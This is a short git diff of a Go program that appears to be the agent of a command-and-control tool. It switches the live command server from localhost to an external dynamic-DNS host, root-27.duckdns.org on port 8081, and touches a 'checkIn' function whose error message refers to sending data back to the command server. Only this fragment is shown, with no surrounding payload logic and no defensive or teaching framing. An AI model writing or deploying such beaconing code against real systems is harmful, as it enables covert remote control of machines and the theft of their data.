@@ -31,9 +31,9 @@ import (
 
 // Setting the command server
 // var command_server string = "https://192.168.0.69:8081"
-// var command_server string = "https://root-27.duckdns.org:8081"
+var command_server string = "https://root-27.duckdns.org:8081"
 
-var command_server string = "https://localhost:8081"
+// var command_server string = "https://localhost:8081"
 
 // var command_server string = "http://192.168.0.29:8081"
 
@@ -211,7 +211,7 @@ func checkIn() {
 	client := &http.Client{}
 	res, err := client.Do(r)
 	if err != nil {
-		fmt.Println("Error sending data back to command server")
+		log.Println("Error sending data back to command server")
 		return
 	}
 	defer res.Body.Close()
